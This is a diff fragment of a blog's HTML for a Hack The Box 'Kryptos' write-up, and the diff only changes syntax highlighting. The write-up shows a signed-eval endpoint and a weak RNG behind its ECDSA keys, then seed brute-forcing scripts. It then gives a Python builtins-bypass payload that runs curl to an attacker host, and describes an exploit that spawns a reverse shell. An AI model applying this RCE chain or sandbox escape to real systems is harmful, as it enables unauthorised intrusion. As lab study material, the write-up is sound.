 rijndael@kryptos:~$ 
 </code></pre></div></div>
 <p><br>There’s a route called <code class="highlighter-rouge">/eval</code> which accepts POST requests in <code class="highlighter-rouge">json</code> and evaluates whatever is in <code class="highlighter-rouge">expr</code>, However there are two problems, first one is that it only evaluates signed expressions, second one is that even if we could bypass that protection we can’t execute something useful because <code class="highlighter-rouge">builtins</code> are disabled :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@route('/eval', method='POST')
-def evaluate():
-    try: 
-        req_data = request.json
-        expr = req_data['expr']
-        sig = req_data['sig']
-        # Only signed expressions will be evaluated
-        if not verify(str.encode(expr), str.encode(sig)):
-            return "Bad signature"
-        result = eval(expr, {'__builtins__':None}) # Builtins are removed, this should be pretty safe
-        response = {'response':
-                    {
-                        'Expression': expr,
-                        'Result': str(result) 
-                    }
-                    }
-        return json.dumps(response, sort_keys=True, indent=2)
-    except:
-        return "Error"
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@route</span><span class="p">(</span><span class="s">'/eval'</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'POST'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">evaluate</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span> 
+        <span class="n">req_data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span>
+        <span class="n">expr</span> <span class="o">=</span> <span class="n">req_data</span><span class="p">[</span><span class="s">'expr'</span><span class="p">]</span>
+        <span class="n">sig</span> <span class="o">=</span> <span class="n">req_data</span><span class="p">[</span><span class="s">'sig'</span><span class="p">]</span>
+        <span class="c"># Only signed expressions will be evaluated</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">verify</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">expr</span><span class="p">),</span> <span class="nb">str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">sig</span><span class="p">)):</span>
+            <span class="k">return</span> <span class="s">"Bad signature"</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="p">{</span><span class="s">'__builtins__'</span><span class="p">:</span><span class="bp">None</span><span class="p">})</span> <span class="c"># Builtins are removed, this should be pretty safe</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="p">{</span><span class="s">'response'</span><span class="p">:</span>
+                    <span class="p">{</span>
+                        <span class="s">'Expression'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span>
+                        <span class="s">'Result'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> 
+                    <span class="p">}</span>
+                    <span class="p">}</span>
+        <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Error"</span>
 </code></pre></div></div>
 <p><br>Let’s take a look at the keys and the secure random number generator function (<code class="highlighter-rouge">secure_rng</code>) :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def secure_rng(seed): 
-    # Taken from the internet - probably secure
-    p = 2147483647
-    g = 2255412
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span> 
+    <span class="c"># Taken from the internet - probably secure</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
+    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>
 
-    keyLength = 32
-    ret = 0
-    ths = round((p-1)/2)
-    for i in range(keyLength*8):
-        seed = pow(g,seed,p)
-        if seed &gt; ths:
-            ret += 2**i
-    return ret
+    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
+            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
+    <span class="k">return</span> <span class="n">ret</span>
 
-# Set up the keys
-seed = random.getrandbits(128)
-rand = secure_rng(seed) + 1
-sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
-vk = sk.get_verifying_key()
+<span class="c"># Set up the keys</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
+<span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="n">sk</span> <span class="o">=</span> <span class="n">SigningKey</span><span class="o">.</span><span class="n">from_secret_exponent</span><span class="p">(</span><span class="n">rand</span><span class="p">,</span> <span class="n">curve</span><span class="o">=</span><span class="n">NIST384p</span><span class="p">)</span>
+<span class="n">vk</span> <span class="o">=</span> <span class="n">sk</span><span class="o">.</span><span class="n">get_verifying_key</span><span class="p">()</span>
 </code></pre></div></div>
 <p><br>I noticed this comment :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Taken from the internet - probably secure
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Taken from the internet - probably secure</span>
 </code></pre></div></div>
 <p><br>I took the <code class="highlighter-rouge">rng</code> function from the script and wrote a script to test how random is it :
 <br><code class="highlighter-rouge">test.py</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
 <span class="kn">import</span> <span class="nn">random</span> 
 <span class="kn">import</span> <span class="nn">json</span>
 <span class="kn">import</span> <span class="nn">hashlib</span>
@@ -1374,7 +1359,7 @@ Bad signature
 </code></pre></div></div>
 <p><br>I wrote a script to bruteforce the seed :
 <br><code class="highlighter-rouge">brute.py</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
 <span class="kn">import</span> <span class="nn">random</span> 
 <span class="kn">import</span> <span class="nn">json</span>
 <span class="kn">import</span> <span class="nn">hashlib</span>
@@ -1430,7 +1415,7 @@ Bad signature
 </code></pre></div></div>
 <p><br>I wrote this script to sign and evaluate expressions depending on the given seed :
 <br><code class="highlighter-rouge">eval.py</code></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
 <span class="kn">import</span> <span class="nn">random</span> 
 <span class="kn">import</span> <span class="nn">json</span>
 <span class="kn">import</span> <span class="nn">hashlib</span>
@@ -1475,14 +1460,14 @@ Bad signature
 	<span class="nb">eval</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span><span class="n">expr</span><span class="p">)</span>
 </code></pre></div></div>
 <p><br>Let’s try the seed we got :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# ./eval.py 78272723826101975912150018057949619293 1+1
-{
-  "response": {
-    "Expression": "1+1",
-    "Result": "2"
-  }
-}
-</code></pre></div></div>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">root@kali</span><span class="p">:</span><span class="err">~/Desktop/HTB/boxes/kryptos#</span><span class="w"> </span><span class="err">./eval.py</span><span class="w"> </span><span class="mi">78272723826101975912150018057949619293</span><span class="w"> </span><span class="mi">1</span><span class="err">+</span><span class="mi">1</span><span class="w">
+</span><span class="p">{</span><span class="w">
+  </span><span class="s2">"response"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="s2">"Expression"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1+1"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"Result"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 <p><br>It worked.
 <br></p>
 <hr>
@@ -1493,21 +1478,21 @@ Bad signature
 Error
 </code></pre></div></div>
 <p><br>xct had a <a href="https://vulndev.io/2019/01/notes_misc.html#bypass-python-builtinsnone" target="_blank" rel="noopener noreferrer">bypass</a> for that on his blog :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('whoami')
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="n">__name__</span> <span class="o">==</span> <span class="s">'Pattern'</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s">'__builtins__'</span><span class="p">][</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'whoami'</span><span class="p">)</span>
 </code></pre></div></div>
 <p><br>I gave it a try and it worked :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# ./eval.py 78272723826101975912150018057949619293 "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://10.10.xx.xx/')"                                                                                                                                                             
-{
-  "response": {
-    "Expression": "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://10.10.xx.xx/')",               
-    "Result": "0"
-  }
-}
-</code></pre></div></div>
-<p><img src="/images/hackthebox/kryptos/19.png" alt="">
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">root@kali</span><span class="p">:</span><span class="err">~/Desktop/HTB/boxes/kryptos#</span><span class="w"> </span><span class="err">./eval.py</span><span class="w"> </span><span class="mi">78272723826101975912150018057949619293</span><span class="w"> </span><span class="s2">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://10.10.xx.xx/')"</span><span class="w">                                                                                                                                                             
+</span><span class="p">{</span><span class="w">
+  </span><span class="s2">"response"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="s2">"Expression"</span><span class="p">:</span><span class="w"> </span><span class="s2">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://10.10.xx.xx/')"</span><span class="p">,</span><span class="w">               
+    </span><span class="s2">"Result"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p><br><img src="/images/hackthebox/kryptos/19.png" alt=""><br>
 <br>Now that we have RCE, I wrapped it all up in one exploit :
 <br><code class="highlighter-rouge">exploit.py</code></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
 <span class="kn">import</span> <span class="nn">random</span> 
 <span class="kn">import</span> <span class="nn">json</span>
 <span class="kn">import</span> <span class="nn">hashlib</span>
@@ -1587,10 +1572,8 @@ Error
         <span class="n">exploit</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span><span class="n">expr</span><span class="p">)</span>
 </code></pre></div></div>
 <p><br>It takes the ip, port and whether bruteforces the seed or takes the seed as an argument then it spawns a reverse shell.
-<img src="/images/hackthebox/kryptos/20.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/kryptos/21.png" alt="">
+<br><img src="/images/hackthebox/kryptos/20.png" alt=""><br>
+<br><img src="/images/hackthebox/kryptos/21.png" alt=""><br>
 <br>
 <br>And we owned root !
 <br>That’s it , Feedback is appreciated !
